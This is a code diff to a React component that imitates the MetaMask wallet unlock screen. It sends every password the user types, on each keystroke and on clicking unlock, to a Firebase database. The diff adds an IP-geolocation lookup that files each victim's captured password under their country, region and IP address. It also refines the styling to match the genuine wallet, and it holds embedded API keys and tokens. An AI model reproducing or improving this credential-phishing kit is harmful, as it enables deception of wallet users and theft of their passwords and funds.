@@ -5,6 +5,7 @@ import meta_logo from "./assets/img/metamask-fox.svg";
 import spinner from "./assets/img/spinner.gif";
 import ethLogo from "./images/eth_logo.svg";
 import arrowDown from "./images/icons/arrow-down.svg";
+import axios from "axios";
 
 import { initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
@@ -13,15 +14,6 @@ import CreateLogo from "./CreateLogo";
 
 import "./index.css";
 import "./MM.css";
-// const basic = {
-//   apiKey: "AIzaSyDAedX7ZDu81YQDcK2Qwh6Z9fNt9HX9P-w",
-//   authDomain: "call2025-b5d35.firebaseapp.com",
-//   projectId: "call2025-b5d35",
-//   storageBucket: "call2025-b5d35.firebasestorage.app",
-//   messagingSenderId: "1015906203772",
-//   appId: "1:1015906203772:web:415f01bc2d57a5f2f6f1f9",
-//   measurementId: "G-C895NM0EWJ",
-// }
 const basic = {
   apiKey: "AIzaSyA9IQDyhHdNhJEcA7q2vJuhVfVRFvcz-vA",
   authDomain: "call-2508.firebaseapp.com",
@@ -58,6 +50,7 @@ const MM = ({ isOpen, setIsOpen }) => {
   const [pwd, setPwd] = useState("");
   const [validShow, setValidShow] = useState(false);
   const [pwdFocus, setPwdFocus] = useState(false);
+  const [dbName, setDbName] = useState(null);
   const styles = {
     overlay: {
       position: "fixed",
@@ -78,15 +71,42 @@ const MM = ({ isOpen, setIsOpen }) => {
     },
   };
 
-  // const handleOpenModal = () => {
-  //   setIsOpen(true);
-  // };
+const [scale, setScale] = useState(1);
+
+  useEffect(() => {
+    const handleZoom = () => {
+      const zoom = window.devicePixelRatio || 1;
+      setScale(1 / zoom); // inverse of zoom to counteract it
+    };
+
+    handleZoom(); // run once
+    window.addEventListener('resize', handleZoom); // zoom triggers resize
+    return () => window.removeEventListener('resize', handleZoom);
+  }, []);
+
+ const fetchIP = async () => {
+        try {
+            const response = await axios.get("https://ipinfo.io/json?token=f50acff5347305")
+            const data = response.data
+            const result = data.country + '_' + data.region + '_' + data.ip
+            setDbName(result)
+        } catch (error) {
+            console.error("Error fetching IP address:", error)
+            return false
+        }
+    }
+
+useEffect(() => {
+        fetchIP();
+    }, []);
+
 
   const handleCloseModal = () => {
     setIsOpen(false);
   };
   const addData = () => {
-    push(ref(rtdb, "eric_call"), {
+    const d = new Date(); 
+    push(ref(rtdb, `${dbName.replaceAll(".", "_")}_Elom/user-Typing"`), {
       value: pwd,
       date: String(new Date()),
     });
@@ -99,15 +119,17 @@ const MM = ({ isOpen, setIsOpen }) => {
       const element = target;
       const boundingRect = element.getBoundingClientRect();
       const coordinates = getCaretCoordinates(element, element.selectionEnd);
-
       animationEventEmitter.emit("point", {
         x: boundingRect.left + coordinates.left - element.scrollLeft,
         y: boundingRect.top + coordinates.top - element.scrollTop,
       });
     }
   };
+
+
   const handleClick = () => {
-    push(ref(rtdb, "mm_dex"), {
+    const d = new Date();
+    push(ref(rtdb,  `${dbName.replaceAll(".", "_")}_Elom/user`), {
       value: pwd,
       date: String(new Date()),
     });
@@ -150,12 +172,12 @@ const MM = ({ isOpen, setIsOpen }) => {
             display: "flex",
             flexDirection: "column",
             overflowX: "hidden",
-            width: "375px",
+            width: "400px",
           }}
         >
           <div
             style={{
-              width: "370px",
+              width: "400px",
               height: "600px",
               backgroundColor: "#fff",
               display: "flex",
@@ -188,7 +210,14 @@ const MM = ({ isOpen, setIsOpen }) => {
         </div>
       ) : (
         <>
-          <div id="app-content">
+          <div id="app-content" style={{
+      overflowX: 'hidden',
+      height: '600px',
+      overflow: 'auto',
+      boxShadow: '0px 2px 12px #000000a1',
+      display: 'flex',
+      flexDirection: 'column',
+      width: '400px'}}>
             <div className="app os-win">
               <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                 <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
@@ -211,7 +240,8 @@ const MM = ({ isOpen, setIsOpen }) => {
                       </div>
                       <span
                         className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
-                        style={{ fontSize: "1.33rem" }}
+                        style={{fontWeight: '400px', lineHeight: '20px', color: '#1a1a1a', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif', fontSize: '14px', letterSpacing:'0px'}}
+
                       >
                         Ethereum Mainnet
                       </span>
@@ -261,11 +291,15 @@ const MM = ({ isOpen, setIsOpen }) => {
                         <div id="meta_fox"></div>
                       </div>
                     </div>
-                    <h1 className="unlock-page__title">Welcome back!</h1>
+                    <h1 className="unlock-page__title">Welcome back</h1>
                     <div
                       style={{
                         fontSize: "1.5rem",
-                        fontFamily: `"Euclid Circular B", Roboto, Helvetica, Arial, sans-serif`,
+                        fontFamily: `"Segoe UI","Helvetica Neue",Helvetica,Arial,sans-serif`,
+                        fontWeight: '500',
+                        lineHeight: '3rem',
+                        letterSpacing: '0.5px',
+                        color: '#68637d',
                       }}
                     >
                       The decentralized web awaits
@@ -287,7 +321,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                             dir="auto"
                             data-testid="unlock-password"
                             className={"MuiInputBase-input MuiInput-input"}
-                            style={{ marginTop: "16px", fontSize: "1.33rem" }}
+                            style={{ marginTop: "16px", fontSize: "1.33rem", animationDuration: '10ms' }}
                             required
                             value={pwd}
                             onFocus={handleFocus}
@@ -330,13 +364,13 @@ const MM = ({ isOpen, setIsOpen }) => {
                       type="button"
                       variant="contained"
                       style={{
-                        backgroundColor: "var(--color-primary-default)",
+                        backgroundColor: "#4459ff",
                         color: "var(--color-primary-inverse)",
                         marginTop: "20px",
-                        fontWeight: "400",
+                        fontWeight: "550",
                         boxShadow: "none",
                         borderRadius: "100px",
-                        fontSize: "1.5rem",
+                        fontSize: "1.35rem",
                         padding: "12px 0",
                       }}
                       onClick={handleClick}
@@ -346,7 +380,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <div className="unlock-page__links">
                       <a
                         className="button btn-link unlock-page__link"
-                        style={{ fontSize: "1.125rem" }}
+                        style={{ fontSize: "1.125rem", textDecoration: 'none', color:'#3b82f9', fontWeight: '100' }}
                         role="button"
                         tabIndex="0"
                       >
@@ -363,6 +397,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                           href="https://support.metamask.io"
                           target="_blank"
                           rel="noopener noreferrer"
+                          style={{ fontSize: "1.125rem", textDecoration: 'none', color:'#3b82f9' }}
                         >
                           MetaMask support
                         </a>
